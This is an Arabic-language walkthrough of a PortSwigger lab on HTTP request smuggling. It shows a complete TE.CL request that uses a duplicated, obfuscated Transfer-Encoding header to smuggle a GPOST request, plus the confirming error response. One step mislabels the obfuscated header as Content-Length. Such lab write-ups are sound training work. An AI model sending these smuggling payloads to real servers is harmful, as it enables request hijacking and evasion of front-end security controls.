# [HTTP request smuggling, obfuscating the TE header](https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header)

## **`الهدف`**
قم بتهريب طلب إلى سيرفر الواجهة الخلفية، بحيث يبدو أن الطلب التالي الذي تتم معالجته بواسطة سيرفر الواجهة الخلفية يستخدم `Method` تُسمى `GPOST`.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater`
```http
GET / HTTP/2
Host: 0a4800a2042a8542811fc04600da009c.web-security-academy.net
Cookie: session=oux5cxXO7F1DKP4OZWPmcjniASXBGsnr
```
ثم سنقوم بالتالي:
1. تغيير نوع البروتوكول إلى `HTTP/1.1` من داخل `Inspector panel`.
2. تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`.
3. دمج طلب `GPOST` كامل في نهاية الطلب الأول
4. إستخدام خيار `Convert to Chunked` في إضافة `HTTP request smuggler`.
5. إضافة سطرين جدد `\r\n\r\n` بعد الصفر الأخير.
6. يجب جعل ترويسة `Content-Length` الأخيرة التي ستكون في الطلب الثاني، أكبر قليلًا من العدد الفعلي للبايتس في الطلب الثاني ليبقى معلقًا ويتدمج دمجه مع الطلب التالي.
7. تعديل إعدادات الـ `Repeater` ونقوم بإلغاء إختيار `Update Content-Length`، عندما نجرب طريقة `TE.CL` ولكن سنتركها تعمل عندما نجرب طريقة `CL.TE`.
8. تجربة العديد من الطرق لإخفاء ترويسة `Content-Length`، والطريقة التي ستنجح في هذ اللاب هو تكرار الترويسة مرة أخرى بقيمة خاطئة.
9. تعديل جسم الطلب ليناسب هجوم `TE.CL`

ليصبح شكل الطلب فى النهاية كالتالي:
```http
POST / HTTP/1.1
Host: 0a4800a2042a8542811fc04600da009c.web-security-academy.net
Cookie: session=oux5cxXO7F1DKP4OZWPmcjniASXBGsnr
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: TEST

57
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 06

0


```
وسنقوم بإرساله أول مرة وستكون الاستجابة طبيعية ولكن بمجرد إرساله مرة أخرى سنجد أن الاستجابة تحتوي علي رسالة خطأ `"Unrecognized method GPOST"` لننتهي من حل اللاب
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 27

"Unrecognized method GPOST"
```
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب`** [HTTP request smuggling, basic CL.TE vulnerability](./HTTP-request-smuggling,-basic-CL.TE-vulnerability.md)
